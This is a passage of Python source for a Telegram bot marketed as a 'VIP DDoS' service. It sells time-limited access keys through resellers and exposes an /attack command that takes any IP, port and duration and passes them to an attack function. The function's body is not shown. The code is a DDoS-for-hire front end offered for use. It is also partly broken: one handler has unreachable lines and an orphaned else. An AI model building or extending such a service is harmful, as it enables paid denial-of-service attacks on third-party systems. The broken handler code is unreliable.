            log_action(user_id, username, "/genkey", f"Key: {custom_key}", f"Unblocked key {custom_key} during regeneration")
    else:
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],
            "blocked": False,
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "generated"
        stats["total_keys"] += 1
        stats["key_gen_timestamps"].append(generated_time)

    save_data()

    for uid in keys[custom_key]["devices"]:
        if uid in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[uid] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": context}
    save_data()

    device_limit_display = "Unlimited" if device_limit == float('inf') else device_limit
    response = (
        f"Key {action} successfully 🔑\n"
        f"`Key: {custom_key}`\n"
        f"Duration: {duration}\n"
        f"Device Limit: {device_limit_display}\n"
        f"Context: {context.capitalize()} Only!\n"
        f"Generated by: @{generated_by}\n"
        f"Generated on: {keys[custom_key]['generated_time']}"
    )
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_data()
            response += f"\nCost: {cost} Rs 💰\nRemaining balance: {resellers[user_id]} Rs"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/genkey", f"Key: {custom_key}, Duration: {duration}, Device Limit: {device_limit_display}, Context: {context}, Generated by: @{generated_by}", response)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["help"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    help_text = """
    🌌 **VIP DDOS HELP GUIDE** 🌌
    🔥 **BOT CONTROLS** 🔥
    - /start - Start the bot 🚀
    - /myinfo - Check full info about yourself ℹ️
    - /help - Show this guide 📋
    - /checkadmin - Check all admins and overlords ✅
    🔥 **POWER MANAGEMENT** 🔥
    - /attack <ip> <port> <time> - Launch an attack (admin & authorized users only, needs valid key) 💥
    - /setcooldown <seconds> - Set attack cooldown (admin only) ⏳
    - /checkcooldown - Check current cooldown ⏳
    - /addreseller <user_id> <balance> - Add a new reseller (admin only) 💰
    - /genkey - Generate a key 🔑
      - Overlords: /genkey <duration> [device_limit] <key_name> <context> (e.g., /genkey 1d 999 sadiq group)
      - Admins/Resellers: /genkey key <duration> <key_name> (e.g., /genkey key 1d rahul) [Only group keys]
      - Context (Overlords): dm, group, groups
    - /stats - View live bot stats (Overlord only) 📊
    - /logs - View recent logs (Overlord only) 📜
    - /users - List authorized users (admin only) 👥
    - /add <user_id> - Add user ID for access without a key (admin only) ➕
    - /remove <user_id> - Remove a user (admin only) ➖
    - /resellers - View resellers 💰
    - /addbalance <reseller_id> <amount> - Add balance to a reseller (admin only) 💸
    - /removereseller <reseller_id> - Remove a reseller (admin only) 🗑️
    - /block <key_name> - Block a key & remove users (admin only) 🚫
    - /addadmin <username_or_id> - Add an admin (Overlord only) ➕
    - /removeadmin <username_or_id> - Remove an admin (Overlord only) ➖
    - /redeem <key_name> - Redeem your key (e.g., /redeem Rahul_sadiq-rahul) 🔓
    - /balance - Check your reseller balance (resellers only) 💰
    - /listkeys - List all keys with details (admin only) 🔑
    📋 **EXAMPLE**:
    - /genkey 1d all sadiq group - Generate group key (Overlord only)
    - /genkey key 1d rahul - Generate 1-day group key (Admins/Resellers)
    - /attack 192.168.1.1 80 120 - Launch an attack 💥
    - /redeem Rahul_sadiq-rahul - Redeem your key 🔓
    - /listkeys - View all keys 🔑
    Buy key from @Rahul_618 🔑
    Any problem contact @Rahul_618 📩
    Join VIP DDoS channel: https://t.me/devil_ddos 🌐
    """
    safe_reply(bot, message, help_text)
    log_action(user_id, username, "/help", "", help_text)
    save_data()

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["balance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance} Rs 💰"
    else:
        response = "Access Denied: Reseller only command 🚫"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/balance", "", response)
    save_data()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["redeem"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    
    if is_admin(user_id, username):
        response = "Bhai, admin ko key ki zarurat nahi! ✅"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /redeem <key_name>\nExample: /redeem Rahul_sadiq-rahul 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    key = command_parts[1].strip()
    if user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response = f"You already have an active key! 🔑\nContext: {user_info['context'].capitalize()} Only!\nExpires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\nPlease wait until it expires to redeem a new key. ⏳"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/redeem", f"Key: {key}", response)
                return
            else:
                del users[user_id]
                save_data()
                log_action(user_id, username, "/redeem", f"Removed expired user access for UserID: {user_id}", "User access removed due to expiration")
        except (ValueError, KeyError):
            response = "Error: Invalid user data. Contact @Rahul_618 📩"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response, "Invalid user data")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            response = "This key has been blocked. Contact @Rahul_618 🚫"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key]["context"] != chat_type:
            response = f"This key is for {keys[key]['context'].capitalize()} use only. Use it in a {keys[key]['context']} chat. ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if keys[key]["device_limit"] != float('inf') and len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            response = "App ne der kar di 😅"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        if user_id in keys[key]["devices"]:
            response = "You have already redeemed this key. 🔑"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        duration = keys[key]["duration"]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            response = "Invalid duration in key. Contact @Rahul_618 📩"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response)
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
        users[user_id] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": chat_type}
        keys[key]["devices"].append(user_id)
        stats["redeemed_keys"] += 1
        save_data()
        response = f"Key redeemed successfully! 🎉\nContext: {chat_type.capitalize()} Only!\nExpires on: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')} ⏳"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}, Context: {chat_type}, Expiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}", response)
    else:
        response = "Invalid or expired key! Buy a new key for 50₹ and DM @Rahul_618. 🔑"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
    save_data()

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["block"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /block <key_name>\nExample: /block Rahul_sadiq-rahul 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return
    key_name = command_parts[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        response = "Invalid key format. Key must start with 'Rahul_sadiq-' ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}", response)
        return
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker_username = keys[key_name].get("blocked_by_username", "Unknown")
            block_time = keys[key_name].get("blocked_time", "Unknown")
            response = f"Key `{key_name}` is already blocked. 🚫\nBlocked by: @{blocker_username}\nBlocked on: {block_time}"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/block", f"Key: {key_name}", response)
            return
        blocker_username = username or f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker_username
        keys[key_name]["blocked_time"] = block_time
        # Remove associated users
        affected_users = []
        for device_id in keys[key_name]["devices"]:
            if device_id in users:
                affected_users.append(device_id)
                del users[device_id]
        save_data()
        response = f"Key `{key_name}` has been blocked successfully. 🚫\nBlocked by: @{blocker_username}\nBlocked on: {block_time}"
        if affected_users:
            response += f"\nRemoved access for users: {', '.join(affected_users)}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}, Blocked by: @{blocker_username}, Blocked on: {block_time}, Affected Users: {affected_users}", response)
    else:
        response = f"Key `{key_name}` not found. Check keys.json or regenerate the key. ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key_name}", response)
        with open(BLOCK_ERROR_LOG, "a") as log_file:
            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} failed. Available keys: {list(keys.keys())}\n")
    save_data()

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["add"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /add <user_id>\nExample: /add 1807014348 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return
    target_user_id = command_parts[1]
    if target_user_id in authorized_users:
        response = f"User {target_user_id} is already authorized. ✅"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Target User ID: {target_user_id}", response)
        return
    expiration_time = add_time_to_current_date(months=1)
    authorized_users[target_user_id] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": "both"}
    stats["total_users"].add(target_user_id)
    save_data()
    response = f"User {target_user_id} added with access until {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')} (both group and private) 🎉"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/add", f"Target User ID: {target_user_id}, Expiration: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}", response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["logs"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    if not is_overlord(user_id, username):
        response = "Access Denied: Overlord only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", f"Command: {command}", response)
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
            response = "Logs sent successfully! 📜"
        except FileNotFoundError:
            response = "No data found ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/logs", f"Command: {command}", response)
            return
    else:
        response = "No data found ❌"
        safe_reply(bot, message, response)
    log_action(user_id, username, "/logs", f"Command: {command}", response)
    save_data()

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["start"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    has_active_access = False
    if is_admin(user_id, username):
        has_active_access = True
    elif user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_active_access = True
        except (ValueError, KeyError):
            has_active_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_active_access = True
        except (ValueError, KeyError):
            has_active_access = False
    response = (
        f"🌌 **WELCOME TO VIP DDOS BHAI!** 🌌\n"
        f"Bot Name: Devil of DDoS Rahul 😈\n"
        f"Owner: Sadiq 👑\n"
        f"Created by: Sadiq ⚡️\n"
        f"Use /help to see all commands 📋\n"
        f"Join https://t.me/devil_ddos 🌐\n\n"
        f"{COMPULSORY_MESSAGE}\n"
    )
    if not has_active_access:
        response += "Bhai, key lele @Rahul_618 se ya admin se authorize karwa le! 🔑"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/start", "", response)
    save_data()

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["attack"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    
    has_access = False
    if is_admin(user_id, username):
        has_access = True
    elif user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date and has_valid_context(user_id, chat_type):
                has_access = True
        except (ValueError, KeyError):
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except (ValueError, KeyError):
            has_access = False
    
    if not has_access:
        response = f"BSDK, access nahi hai! {chat_type.capitalize()} key le @Rahul_618 se ya admin se authorize karwa! 🔑"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = "Usage: /attack <ip> <port> <time> 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return
    target, port, time = command_parts[1], int(command_parts[2]), int(command_parts[3])
    if time > 240:
        response = "Error: Use less than 240 seconds ⏳"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    username = username or f"UserID_{user_id}"
    execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    save_data()

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["setcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /setcooldown <seconds>\nExample: /setcooldown 60 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    try:
        seconds = int(command_parts[1])
        if seconds < 0:
            response = "Cooldown must be a non-negative number! ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
            return
        set_cooldown(seconds)
        response = f"Cooldown set to {seconds} seconds successfully! ⏳"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Seconds: {seconds}", response)
    except ValueError:
        response = "Invalid seconds value! Use a number. ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
    save_data()

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["checkcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    response = f"Current attack cooldown: {COOLDOWN_PERIOD} seconds ⏳"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", "", response)
    save_data()

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["users"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", f"Command: {command}", response)
        return

    response = "=== AUTHORIZED USERS ===\n"
    if not authorized_users and not users:
        response += "No authorized users found.\n"
    else:
        # Authorized users (via /add)
        if authorized_users:
            response += "\n**Manually Authorized Users**:\n"
            for uid, info in authorized_users.items():
                response += f"User ID: {uid}\nExpiration: {info['expiration']}\nContext: {info['context'].capitalize()}\n\n"
        # Key-redeemed users
        if users:
            response += "\n**Key-Redeemed Users**:\n"
            for uid, info in users.items():
                response += f"User ID: {uid}\nExpiration: {info['expiration']}\nContext: {info['context'].capitalize()}\n\n"

    response += "Contact @Rahul_618 for issues 📩"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", "", response)
    save_data()

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["remove"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /remove <user_id>\nExample: /remove 1807014348 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    target_user_id = command_parts[1]
    removed = False
    if target_user_id in authorized_users:
        del authorized_users[target_user_id]
        removed = True
    if target_user_id in users:
        del users[target_user_id]
        # Remove user from keys' devices list
        for key, key_info in keys.items():
            if target_user_id in key_info["devices"]:
                key_info["devices"].remove(target_user_id)
        removed = True

    if removed:
        response = f"User {target_user_id} removed successfully! 🗑️"
        save_data()
    else:
        response = f"User {target_user_id} not found! ❌"

    safe_reply(bot, message, response)
    log_action(user_id, username, "/remove", f"Target User ID: {target_user_id}", response)
    save_data()

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["resellers"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/resellers", f"Command: {command}", response)
        return
        
        response += "No resellers found.\n"
    else:
        for reseller_id, balance in resellers.items():
            response += f"Reseller ID: {reseller_id}\nBalance: {balance} Rs 💰\n\n"

    response += "Contact @Rahul_618 for issues 📩"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", "", response)
    save_data()

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addbalance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = "Usage: /addbalance <reseller_id> <amount>\nExample: /addbalance 1807014348 500 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    reseller_id = command_parts[1]
    try:
        amount = int(command_parts[2])
        if amount <= 0:
            response = "Amount must be a positive number! ❌"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)
            return
    except ValueError:
        response = "Invalid amount! Use a number. ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {command_parts[2]}", response)
        return

    if reseller_id not in resellers:
        response = f"Reseller {reseller_id} not found! ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)
        return

    resellers[reseller_id] += amount
    save_data()
    response = f"Balance added successfully! 🎉\nReseller ID: {reseller_id}\nAdded Amount: {amount} Rs\nNew Balance: {resellers[reseller_id]} Rs 💰"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}, New Balance: {resellers[reseller_id]}", response)

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["removereseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /removereseller <reseller_id>\nExample: /removereseller 1807014348 📋"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        response = f"Reseller {reseller_id} not found! ❌"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)
        return

    del resellers[reseller_id]
    save_data()
    response = f"Reseller {reseller_id} removed successfully! 🗑️"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["listkeys"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = "Access Denied: Admin only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", f"Command: {command}", response)
        return

    response = "=== KEY LIST ===\n"
    if not keys:
        response += "No keys found.\n"
    else:
        for key_name, key_info in keys.items():
            device_limit_display = "Unlimited" if key_info["device_limit"] == float('inf') else key_info["device_limit"]
            blocked_status = "Yes" if key_info.get("blocked", False) else "No"
            blocked_by = key_info.get("blocked_by_username", "N/A") if blocked_status == "Yes" else "N/A"
            blocked_time = key_info.get("blocked_time", "N/A") if blocked_status == "Yes" else "N/A"
            generated_time = key_info.get("generated_time", "Unknown")
            generated_by = key_info.get("generated_by", "Unknown")
            expiration_time = datetime.datetime.strptime(generated_time, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            minutes, hours, days, months = parse_duration(key_info["duration"])
            expiration_time = expiration_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
            expiration_str = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
            devices = ", ".join(key_info["devices"]) if key_info["devices"] else "None"
            response += (
                f"Key: {key_name}\n"
                f"Duration: {key_info['duration']}\n"
                f"Device Limit: {device_limit_display}\n"
                f"Devices Used: {devices}\n"
                f"Context: {key_info['context'].capitalize()}\n"
                f"Blocked: {blocked_status}\n"
                f"Blocked By: @{blocked_by}\n"
                f"Blocked On: {blocked_time}\n"
                f"Generated By: @{generated_by}\n"
                f"Generated On: {generated_time}\n"
                f"Expires On: {expiration_str}\n\n"
            )

    response += "Contact @Rahul_618 for issues 📩"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/listkeys", "", response)
    save_data()

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["myinfo"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    response = f"=== YOUR INFO ===\nUser ID: {user_id}\nUsername: @{username}\n"

    # Check if user is Overlord or Admin
    if is_overlord(user_id, username):
        response += "Role: Overlord 👑\nAccess: Full (No Key Needed)\n"
    elif is_admin(user_id, username):
        response += "Role: Admin ✅\nAccess: Full (No Key Needed)\n"
    else:
        response += "Role: User\n"

    # Check reseller status
    if user_id in resellers:
        response += f"Reseller: Yes\nBalance: {resellers[user_id]} Rs 💰\n"

    # Check access status (via key or manual authorization)
    access_status = "No active access 🔒\nBuy a key from @Rahul_618 🔑"
    if user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                access_status = f"Access: Active (Key)\nContext: {user_info['context'].capitalize()} Only!\nExpires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')} ⏳"
            else:
                del users[user_id]
                save_data()
                log_action(user_id, username, "/myinfo", f"Removed expired user access for UserID: {user_id}", "User access removed due to expiration")
        except (ValueError, KeyError):
            access_status = "Error: Invalid user data. Contact @Rahul_618 📩"
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id]['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                access_status = f"Access: Active (Authorized)\nContext: {authorized_users[user_id]['context'].capitalize()}\nExpires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')} ⏳"
            else:
                del authorized_users[user_id]
                save_data()
                log_action(user_id, username, "/myinfo", f"Removed expired authorized user access for UserID: {user_id}", "Authorized user access removed due to expiration")
        except (ValueError, KeyError):
            access_status = "Error: Invalid authorized user data. Contact @Rahul_618 📩"

    response += access_status + "\n\nJoin VIP DDoS: https://t.me/devil_ddos 🌐"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", "", response)
    save_data()

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["stats"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_overlord(user_id, username):
        response = "Access Denied: Overlord only command 🚫"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/stats", f"Command: {command}", response)
        return

    # Start the live stats dashboard
    message_sent = bot.send_message(
        message.chat.id,
        "Starting live stats dashboard... 📊",
        parse_mode="MarkdownV2"
    )
